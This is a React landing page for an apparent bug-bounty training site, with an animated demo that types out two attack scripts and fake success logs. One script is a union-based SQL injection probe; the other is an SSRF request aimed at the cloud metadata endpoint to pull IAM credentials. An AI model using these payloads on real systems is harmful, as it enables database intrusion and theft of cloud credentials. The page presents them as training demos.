import React from 'react';
import { useNavigate } from 'react-router-dom';
import { Shield, Zap, Target, BookOpen, Layers, ArrowRight, CheckCircle, Crown, FlaskConical, Menu, X, Terminal as TerminalIcon, Twitter, Github, Linkedin, Youtube } from 'lucide-react';
import './Landing.css';

const Landing = () => {
    const navigate = useNavigate();
    const [isMenuOpen, setIsMenuOpen] = React.useState(false);

    // Live Hack Simulation State
    const [hackStep, setHackStep] = React.useState(0);
    const [sequenceIndex, setSequenceIndex] = React.useState(0);
    const [displayCode, setDisplayCode] = React.useState("");
    const [attackIndex, setAttackIndex] = React.useState(0);

    // 100% Kali Realism: Terminal Handshake State
    const [terminalStep, setTerminalStep] = React.useState(0);
    const [terminalTypedText, setTerminalTypedText] = React.useState("");
    const [terminalLogs, setTerminalLogs] = React.useState([]);
    const terminalBodyRef = React.useRef(null);
    const [activeModule, setActiveModule] = React.useState(0);

    // Auto-scroll terminal to bottom
    React.useEffect(() => {
        if (terminalBodyRef.current) {
            terminalBodyRef.current.scrollTop = terminalBodyRef.current.scrollHeight;
        }
    }, [terminalLogs, terminalTypedText, hackStep]);

    // Multi-stage Attacks with Human Keystrokes (Expert Mode)
    // '<' represents backspace, '|' represents a long pause (thought pause)
    const attacks = [
        {
            url: "bugora.app/lessons/advanced-sql-discovery",
            keystrokes: "import requests\n\n# Probing for Union-based SQLi\ntarget = \"http://api.target.com/users?id=1'\"\nr = requests.get(target + \" UNION SELECT NULL,NULL,NULL,user(),database()-- -\")\nprint(r.text)",
            tokens: [
                { text: "import", type: "keyword" },
                { text: " requests\n\n", type: "plain" },
                { text: "# Probing for Union-based SQLi\n", type: "comment" },
                { text: "target", type: "variable" },
                { text: " = ", type: "operator" },
                { text: "\"http://api.target.com/users?id=1'\"", type: "string" },
                { text: "\n", type: "plain" },
                { text: "r", type: "variable" },
                { text: " = ", type: "operator" },
                { text: "requests", type: "method" },
                { text: ".get", type: "method" },
                { text: "(target + ", type: "plain" },
                { text: "\" UNION SELECT NULL,NULL,NULL,user(),database()-- -\"", type: "string" },
                { text: ")\n", type: "plain" },
                { text: "print", type: "keyword" },
                { text: "(r.text)", type: "plain" }
            ],
            terminal: [
                { text: "[*] Initializing local environment for sqlmap-style probe...", type: "info", delay: 0.5 },
                { text: "[*] Testing socket connection to api.target.com:80", type: "info", delay: 1.5 },
                { text: "[+] Connection established. Latency: 42ms", type: "success", delay: 2.2 },
                { text: "[*] Scanning for potential injection points (4 parameters)...", type: "info", delay: 3.5 },
                { text: "[!] HTTP 500: Server error detected on 'id' param. Probing offsets...", type: "info", delay: 5.0 },
                { text: "[*] Injecting UNION-based payload (offset 4,5,6)...", type: "info", delay: 6.5 },
                { text: "[!] SUCCESS: Data stream extracted from 'users' table.", type: "success", delay: 8.0 },
                { text: "[*] Parsing database metadata and user tables...", type: "info", delay: 9.0 },
                { text: "[+] DB: 'vault_prod' | User: 'root@localhost' leak confirmed.", type: "success", delay: 10.5 }
            ],
            summary: "Union-based SQL Injection successful. Extracted database 'vault_prod' and confirmed 'root' access. Database schema exposed."
        },
        {
            url: "bugora.app/lessons/ssrf-iam-pillage",
            keystrokes: "import requests\n\n# Escalating SSRF to IAM Exfiltration\nm_url = \"http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-production-role\"\nr = requests.post(\"http://svc.internal-proxy/v1\", json={\"forward\": m_url})\nprint(r.json())",
            tokens: [
                { text: "import", type: "keyword" },
                { text: " requests\n\n", type: "plain" },
                { text: "# Escalating SSRF to IAM Exfiltration\n", type: "comment" },
                { text: "m_url", type: "variable" },
                { text: " = ", type: "operator" },
                { text: "\"http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-production-role\"", type: "string" },
                { text: "\n", type: "plain" },
                { text: "r", type: "variable" },
                { text: " = ", type: "operator" },
                { text: "requests", type: "method" },
                { text: ".post", type: "method" },
                { text: "(\"http://svc.internal-proxy/v1\", json={", type: "plain" },
                { text: "\"forward\"", type: "string" },
                { text: ": m_url})\n", type: "plain" },
                { text: "print", type: "keyword" },
                { text: "(r.json())", type: "plain" }
            ],
            terminal: [
                { text: "[*] Pre-flight: Verifying server-side listener on port :v1", type: "info", delay: 0.8 },
                { text: "[*] Routing through internal service proxy...", type: "info", delay: 1.8 },
                { text: "[+] Proxy tunnel established at 10.0.42.12", type: "success", delay: 2.5 },
                { text: "[*] Probing cloud metadata endpoint (169.254.169.254)...", type: "info", delay: 4.0 },
                { text: "[*] Extracting IAM credentials from metadata API...", type: "info", delay: 5.5 },
                { text: "[!] CRITICAL: Credentials found for production-role!", type: "success", delay: 7.0 },
                { text: "[+] AccessKeyId: ASIA... | SecretAccessKey: [REDACTED]", type: "success", delay: 8.5 },
                { text: "[+] SessionToken: FwoGZXIvYXdz... (Valid: 3600s)", type: "success", delay: 9.8 },
                { text: "[*] Session successfully hijacked. Persistence established.", type: "info", delay: 11.2 }
            ],
            summary: "SSRF exploit bypassed proxy layers to exfiltrate IAM role 'web-app-production-role' credentials. Session hijack completed."
        }
    ];

    const currentAttack = attacks[attackIndex];

    React.useEffect(() => {
        let timeout;

        // --- 1. Code Editor Typing Phase ---
        if (hackStep === 0) {
            if (sequenceIndex < currentAttack.keystrokes.length) {
                const char = currentAttack.keystrokes[sequenceIndex];
                const delay = Math.random() * 40 + 30; // High speed but smooth
                timeout = setTimeout(() => {
                    setDisplayCode(prev => prev + char);
                    setSequenceIndex(prev => prev + 1);
                }, delay);
            } else {
                // Done typing code: transition to terminal handshake
                timeout = setTimeout(() => setHackStep(1), 800);
            }
        }

        // --- 2. Terminal Handshake Phase ---
        else if (hackStep === 1) {
            const commands = ["cd labs", "ls -la", "python3 payload.py"];
            const currentCmd = commands[terminalStep];

            if (terminalTypedText.length < currentCmd.length) {
                // Type the command
                const char = currentCmd[terminalTypedText.length];
                timeout = setTimeout(() => {
                    setTerminalTypedText(prev => prev + char);
                }, 60);
            } else {
                // Finish command - hold then "Enter"
                timeout = setTimeout(() => {
                    if (terminalStep === 0) {
                        setTerminalLogs(prev => [...prev, { text: `cd labs`, type: "command", dir: "~" }]);
                        setTerminalStep(1);
                        setTerminalTypedText("");
                    } else if (terminalStep === 1) {
                        setTerminalLogs(prev => [
                            ...prev,
                            { text: `ls -la`, type: "command", dir: "~/labs" },
                            { text: "total 24K\ndrwxr-xr-x 2 root root 4.0K Feb 5 23:55 .\ndrwxr-xr-x 4 root root 4.0K Feb 5 23:54 ..\n-rw-r--r-- 1 root root  827 Feb 5 23:56 payload.py\n-rw-r--r-- 1 root root  142 Feb 5 23:56 .env", type: "info" }
                        ]);
                        setTerminalStep(2);
                        setTerminalTypedText("");
                    } else if (terminalStep === 2) {
                        setTerminalLogs(prev => [...prev, { text: `python3 payload.py`, type: "command", dir: "~/labs" }]);
                        // Final command done: transition to execution phase
                        setHackStep(2);
                    }
                }, 600);
            }
        }

        // --- 3. Execution Phase (Logs appearing) ---
        else if (hackStep === 2) {
            timeout = setTimeout(() => setHackStep(3), 6500);
        }

        return () => clearTimeout(timeout);
    }, [sequenceIndex, hackStep, terminalStep, terminalTypedText, currentAttack, attackIndex]);

    const nextAttack = () => {
        if (attackIndex < attacks.length - 1) {
            setAttackIndex(prev => prev + 1);
            setSequenceIndex(0);
            setDisplayCode("");
            setHackStep(0);
            setTerminalStep(0);
            setTerminalTypedText("");
            setTerminalLogs([]);
        } else {
            navigate('/challenges');
        }
    };

    const resetSimulation = () => {
        setSequenceIndex(0);
        setDisplayCode("");
        setHackStep(0);
        setAttackIndex(0);
        setTerminalStep(0);
        setTerminalTypedText("");
        setTerminalLogs([]);
    };

    // Render logic for organic code (Tokenized on the fly for syntax highlighting)
    const renderCode = () => {
        let remainingDisplay = displayCode;

        return currentAttack.tokens.map((token, index) => {
            if (remainingDisplay.length === 0) return null;

            const tokenLen = token.text.length;
            const content = remainingDisplay.slice(0, tokenLen);
            remainingDisplay = remainingDisplay.slice(tokenLen);

            return (
                <span key={`${attackIndex}-${index}`} className={`c-${token.type}`}>
                    {content}
                </span>
            );
        });
    };

    return (
        <div className="landing-page">
            {/* Header / Nav */}
            <nav className={`landing-nav ${isMenuOpen ? 'menu-active' : ''}`}>
                <div className="nav-container">
                    <div className="landing-logo">
                        <img src="/logo.svg" alt="Bugora" />
                        <span className="brand-text">Bug<span className="brand-accent">ora</span></span>
                    </div>

                    {/* Mobile Toggle */}
                    <button className="mobile-toggle" onClick={() => setIsMenuOpen(!isMenuOpen)}>
                        {isMenuOpen ? <X /> : <Menu />}
                    </button>

                    <div className={`nav-links ${isMenuOpen ? 'open' : ''}`}>
                        <div className="mobile-menu-backdrop" onClick={() => setIsMenuOpen(false)}></div>
                        <a href="#features" onClick={() => setIsMenuOpen(false)}>Features</a>
                        <a href="#curriculum" onClick={() => setIsMenuOpen(false)}>Curriculum</a>
                        <div className="nav-actions">
                            <button className="nav-btn" onClick={() => { navigate('/auth/login'); setIsMenuOpen(false); }}>Login</button>
                            <button className="nav-btn primary" onClick={() => { navigate('/auth/signup'); setIsMenuOpen(false); }}>Get Started</button>
                        </div>

                        {/* Decorative elements for mobile menu */}
                        <div className="mobile-menu-decoration">
                            <div className="glass-blob"></div>
                            <div className="glass-blob bottom"></div>
                        </div>
                    </div>
                </div>
            </nav>

            {/* Hero Section */}
            <header className="landing-hero">
                <div className="hero-background-wrapper">
                    <img
                        src="/hero-concept.png"
                        alt="Cybersecurity Concept"
                        className="hero-bg-image"
                    />
                    <div className="hero-overlay"></div>
                </div>

                <div className="container">
                    <div className="hero-content">
                        <div className="badge-promo animate-fade-in">
                            <span className="badge-icon"><Zap size={12} /></span>
                            v1.0 Official Launch
                        </div>
                        <h1 className="hero-title animate-fade-in-up">
                            Master the Art of <br />
                            <span className="text-gradient">Cyber Exploration</span>
                        </h1>
                        <p className="hero-subtitle animate-fade-in-up" style={{ animationDelay: '0.1s' }}>
                            Bountypaper is the premium interactive playground where security researchers transform theory into critical findings through immersive labs.
                        </p>
                        <div className="hero-actions animate-fade-in-up" style={{ animationDelay: '0.2s' }}>
                            <button className="btn-hero-primary" onClick={() => navigate('/auth/signup')}>
                                Start Learning Now <ArrowRight size={18} />
                            </button>
                            <button className="btn-hero-secondary" onClick={() => navigate('/onboarding/welcome')}>
                                Explore Platform
                            </button>
                        </div>
                    </div>
                </div>
            </header>

            {/* App Reveal Section */}
            <section className="app-reveal">
                <div className="container">
                    <div className="reveal-wrapper animate-fade-in-up" style={{ animationDelay: '0.3s' }}>
                        <div className="reveal-glass">
                            {/* Browser Header */}
                            <div className="reveal-header">
                                <div className="header-controls">
                                    <div className="dot red"></div>
                                    <div className="dot yellow"></div>
                                    <div className="dot green"></div>
                                </div>
                                <div className="header-address-bar">
                                    <Shield size={12} className="lock-icon" />
                                    <span className="protocol">https://</span>
                                    <span className="domain">{currentAttack.url.split('/')[0]}</span>
                                    <span className="path">/{currentAttack.url.split('/').slice(1).join('/')}</span>
                                </div>
                            </div>

                            <div className="reveal-body">
                                <div className="reveal-app-layout">
                                    {/* Sidebar */}
                                    <div className="reveal-sidebar">
                                        <div className="sidebar-group">
                                            <div className="sidebar-icon active" title="Explorer"><Layers size={22} /></div>
                                            <div className="sidebar-icon" title="Search"><Target size={22} /></div>
                                            <div className="sidebar-icon" title="Source Control"><BookOpen size={22} /></div>
                                        </div>
                                        <div className="sidebar-group bottom">
                                            <div className="sidebar-icon" title="Extensions"><FlaskConical size={22} /></div>
                                            <div className="sidebar-icon" title="Profile"><Crown size={22} /></div>
                                        </div>
                                    </div>

                                    <div className="reveal-main">
                                        <div className="simulation-container">
                                            {/* Code Editor Header */}
                                            <div className="editor-header-tabs">
                                                <div className="tab active">
                                                    <span className="file-icon python">py</span>
                                                    <span className="tab-name">payload.py</span>
                                                    <X size={10} className="close-x" />
                                                </div>
                                                <div className="tab">
                                                    <span className="file-icon">txt</span>
                                                    <span className="tab-name">log.txt</span>
                                                </div>
                                                {hackStep === 1 && (
                                                    <div className="editor-status-badge running animate-pulse">
                                                        <span className="desktop-text">Running script...</span>
                                                        <span className="mobile-text">Executing...</span>
                                                    </div>
                                                )}
                                            </div>

                                            {/* Code Editor Body */}
                                            <div className="editor-content">
                                                <div className="line-numbers">
                                                    {[1, 2, 3, 4, 5, 6, 7, 8].map(n => <div key={n}>{n}</div>)}
                                                </div>
                                                <div className="code-area">
                                                    <pre>{renderCode()}<span className="cursor-block"></span></pre>
                                                </div>
                                            </div>

                                            {/* Terminal Output */}
                                            <div className={`terminal-drawer ${hackStep >= 1 ? 'open' : ''}`}>
                                                <div className="terminal-header">
                                                    <div className="term-tabs">
                                                        <span className="term-tab active">TERMINAL</span>
                                                        <span className="term-tab">OUTPUT</span>
                                                        <span className="term-tab">DEBUG</span>
                                                    </div>
                                                </div>
                                                <div className="terminal-body" ref={terminalBodyRef}>
                                                    {/* Handshake: Executed Commands History */}
                                                    {terminalLogs.map((log, i) => (
                                                        <div key={`log-${i}`} className={`term-line ${log.type}`}>
                                                            {log.type === 'command' ? (
                                                                <div className="prompt-wrapper">
                                                                    <span className="prompt-user">root@kali</span>
                                                                    <span className="prompt-sep">:</span>
                                                                    <span className="prompt-dir">{log.dir || '~'}</span>
                                                                    <span className="prompt-char">#</span>
                                                                    <span className="typed-text ml-2">{log.text}</span>
                                                                </div>
                                                            ) : (
                                                                <div className="pre-output">{log.text}</div>
                                                            )}
                                                        </div>
                                                    ))}

                                                    {/* Active Typing Handshake */}
                                                    {hackStep === 1 && (
                                                        <div className="term-line command">
                                                            <span className="prompt-user">root@kali</span>
                                                            <span className="prompt-sep">:</span>
                                                            <span className="prompt-dir">
                                                                {terminalStep === 0 ? '~' : '~/labs'}
                                                            </span>
                                                            <span className="prompt-char">#</span>
                                                            <span className="typed-text ml-2">
                                                                {terminalTypedText}
                                                                <span className="terminal-cursor"></span>
                                                            </span>
                                                        </div>
                                                    )}

                                                    {/* Main Hacking Execution Logs */}
                                                    {hackStep >= 2 && currentAttack.terminal.map((line, i) => (
                                                        <div key={`hack-log-${i}`} className={`term-line ${line.type} animate-type`} style={{ animationDelay: `${line.delay}s` }}>
                                                            {line.text}
                                                        </div>
                                                    ))}
                                                </div>
                                            </div>

                                            {/* Victory Modal */}
                                            {hackStep >= 3 && (
                                                <div className="simulation-modal-overlay">
                                                    <div className="victory-modal animate-pop-in">
                                                        <div className="victory-glow"></div>
                                                        <div className="victory-icon-wrapper">
                                                            <div className="victory-ring"></div>
                                                            <CheckCircle size={48} className="victory-icon" />
                                                        </div>

                                                        <h3 className="victory-title">
                                                            {attackIndex === 0 ? "Vulnerability Found" : "System Compromised"}
                                                        </h3>

                                                        {/* Attack Result Terminal UI */}
                                                        <div className="modal-result-terminal">
                                                            <div className="mt-header">
                                                                <TerminalIcon size={12} />
                                                                <span>Execution Result - payload.py</span>
                                                            </div>
                                                            <div className="mt-body">
                                                                <div className="mt-line success">
                                                                    {currentAttack.summary}
                                                                </div>
                                                                <div className="mt-line cursor">_</div>
                                                            </div>
                                                        </div>

                                                        <div className="xp-gain">
                                                            <span className="plus">+</span>{attackIndex === 0 ? "50" : "150"} <span className="unit">XP</span>
                                                        </div>

                                                        <button
                                                            className="btn-victory-primary"
                                                            onClick={nextAttack}
                                                        >
                                                            {attackIndex === 0 ? (
                                                                <>Next Phase <ArrowRight size={18} /></>
                                                            ) : (
                                                                <><Zap size={18} fill="currentColor" /> Access Real Lab</>
                                                            )}
                                                        </button>
                                                        <button className="btn-victory-text" onClick={resetSimulation}>
                                                            Reset Lab
                                                        </button>
                                                    </div>
                                                </div>
                                            )}
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div className="floating-stat s1">
                            <Layers size={14} /> 50+ Real Labs
                        </div>
                    </div>
                </div>
            </section>

            {/* Feature Highlights */}
            <section id="features" className="landing-features">
                <div className="container">
                    <div className="section-header animate-fade-in-up">
                        <h2 className="text-gradient">The Bugora Edge</h2>
                        <p className="subtitle">Everything you need to go from amateur to elite bug hunter.</p>
                    </div>
                    <div className="feature-grid">
                        <div className="feature-card animate-fade-in-up" style={{ animationDelay: '0.1s' }}>
                            <div className="feature-card-glow"></div>
                            <div className="feature-icon-wrapper">
                                <div className="feature-icon-glow"></div>
                                <div className="feature-icon"><Layers /></div>
                            </div>
                            <h3>Immersive Curriculum</h3>
                            <p>Structured paths covering OWASP Top 10, Cloud Security, and advanced exploitation.</p>
                        </div>
                        <div className="feature-card animate-fade-in-up" style={{ animationDelay: '0.2s' }}>
                            <div className="feature-card-glow"></div>
                            <div className="feature-icon-wrapper">
                                <div className="feature-icon-glow"></div>
                                <div className="feature-icon"><FlaskConical /></div>
                            </div>
                            <h3>On-Demand Labs</h3>
                            <p>Launch interactive targets in seconds. Practice recon, exploitation, and reporting.</p>
                        </div>
                        <div className="feature-card animate-fade-in-up" style={{ animationDelay: '0.3s' }}>
                            <div className="feature-card-glow"></div>
                            <div className="feature-icon-wrapper">
                                <div className="feature-icon-glow"></div>
                                <div className="feature-icon"><Crown /></div>
                            </div>
                            <h3>Gamified Rewards</h3>
                            <p>Earn XP, unlock badges, and climb the leaderboard as you find more bugs.</p>
                        </div>
                    </div>
                </div>
            </section>

            {/* Curriculum Preview */}
            <section id="curriculum" className="landing-curriculum">
                <div className="container">
                    <div className="curriculum-layout">
                        <div className="curriculum-info animate-fade-in-up">
                            <h2 className="text-display">Real-World <br /><span className="text-gradient">Scenarios</span></h2>
                            <p>We don't teach theory in a vacuum. Every module is based on actual findings from live bug bounty programs.</p>

                            <ul className="curriculum-list">
                                <li><CheckCircle size={18} /> Advanced SQL Injection Techniques</li>
                                <li><CheckCircle size={18} /> SSRF & Cloud Metadata Exfiltration</li>
                                <li><CheckCircle size={18} /> Cross-Site Scripting (XSS) Masterclass</li>
                                <li><CheckCircle size={18} /> Authentication & IDOR Flaws</li>
                            </ul>

                            <button className="btn-secondary mt-lg" onClick={() => navigate('/courses')}>
                                Learn Hacking
                            </button>
                        </div>
                        <div className="curriculum-visual animate-fade-in-up">
                            <div className="module-stack">
                                {[0, 1, 2].map((i) => {
                                    // Calculate dynamic position class based on rotation
                                    const pos = (i - activeModule + 3) % 3;
                                    const posClass = pos === 0 ? 'p1' : pos === 1 ? 'p2' : 'p3';

                                    const moduleData = [
                                        { tag: "WEB EXPLOIT", title: "SQLi Mastery" },
                                        { tag: "RECON", title: "XSS Exploitation" },
                                        { tag: "CLOUD", title: "Cloud Security" }
                                    ];

                                    return (
                                        <div
                                            key={i}
                                            className={`module-item ${posClass}`}
                                            onClick={() => setActiveModule((activeModule + 1) % 3)}
                                        >
                                            <span className="module-tag">{moduleData[i].tag}</span>
                                            {moduleData[i].title}
                                        </div>
                                    );
                                })}
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            {/* Pricing Section */}
            <section className="landing-pricing">
                <div className="container">
                    <div className="pricing-card animate-fade-in-up">
                        <div className="pricing-header">
                            <h2 className="text-display">Join the Elite</h2>
                            <p>Get full access to all labs and courses.</p>
                        </div>
                        <div className="price-tag">
                            <span className="currency">$</span>
                            <span className="amount">1</span>
                            <span className="period">/month</span>
                        </div>
                        <div className="coming-soon-badge">COMING SOON</div>
                        <ul className="pricing-features">
                            <li><CheckCircle size={16} /> Unlimited Lab Runtime</li>
                            <li><CheckCircle size={16} /> AI Hacker Coach (Coming Soon)</li>
                            <li><CheckCircle size={16} /> Advanced Exploit Payloads</li>
                            <li><CheckCircle size={16} /> Priority Lab Support</li>
                        </ul>
                        <button className="btn-primary btn-lg" onClick={() => navigate('/auth/signup')}>
                            JOIN WAITLIST <ArrowRight size={18} />
                        </button>
                    </div>
                </div>
            </section>

            {/* Footer */}
            <footer className="landing-footer">
                <div className="container">
                    <div className="footer-content">
                        <div className="footer-brand">
                            <h2 className="logo-text">Bug<span className="brand-accent">ora</span></h2>
                            <p>Master the art of bug bounty hunting through immersive, real-world hacking scenarios.</p>
                        </div>
                        <div className="footer-links">
                            <a href="#features">Features</a>
                            <a href="#curriculum">Curriculum</a>
                            <a href="#pricing">Pricing</a>
                            <a href="#">Terms</a>
                            <a href="#">Privacy</a>
                        </div>
                        <div className="footer-bottom">
                            <div className="copyright">
                                © 2026 Bugora Labs. All rights reserved.
                            </div>
                            <div className="social-links">
                                <a href="#" className="social-icon"><Twitter size={20} /></a>
                                <a href="#" className="social-icon"><Github size={20} /></a>
                                <a href="#" className="social-icon"><Linkedin size={20} /></a>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
        </div>
    );
};

export default Landing;
